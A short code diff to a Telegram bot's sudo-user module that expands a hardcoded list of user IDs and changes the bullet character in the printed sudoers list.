@@ -11,7 +11,8 @@ from config import BANNED_USERS, OWNER_ID
 
 RDJ_ID = 5728468284
 
-SOME = 5728468284,
+SOME = [5728468284, 6074306896, 6739866282]
+
 
 @app.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
 @language
@@ -53,7 +54,7 @@ async def sudoers_list(client, message: Message, _):
     text = _["sudo_5"]
     user = await app.get_users(RDJ_ID)
     user = user.first_name if not user.mention else user.mention
-    text += f"⬝ {user}\n"
+    text += f"↝ {user}\n"
     count = 0
     smex = 0
     for user_id in SUDOERS:
